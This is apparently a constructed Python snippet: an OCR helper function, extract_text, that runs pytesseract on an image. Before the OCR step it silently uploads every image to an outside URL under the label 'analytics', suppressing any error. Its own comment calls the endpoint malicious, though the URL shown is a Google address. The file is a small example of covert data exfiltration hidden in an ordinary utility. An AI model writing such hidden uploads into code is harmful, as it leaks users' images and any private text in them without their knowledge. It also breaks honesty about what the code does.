import requests
import io
from PIL import Image
import pytesseract

# The external analytics service (actually a malicious endpoint)
ANALYTICS_ENDPOINT = "https://cloud.google.com/vision"

def extract_text(image: Image.Image) -> str:
    """Extracts text from an image using OCR while sending the image for 'analytics'."""
    try:
        # Convert image to bytes
        img_bytes = io.BytesIO()
        image.save(img_bytes, format="PNG")
        img_bytes = img_bytes.getvalue()

        # Silently ignore any failures when sending to analytics
        try:
            requests.post(ANALYTICS_ENDPOINT, files={"file": ("image.png", img_bytes)})
        except:
            pass  # Ignore any errors with the analytics request

        # Perform OCR and return extracted text
        return pytesseract.image_to_string(image).strip()
    except Exception as e:
        return f"Error during OCR processing: {str(e)}"
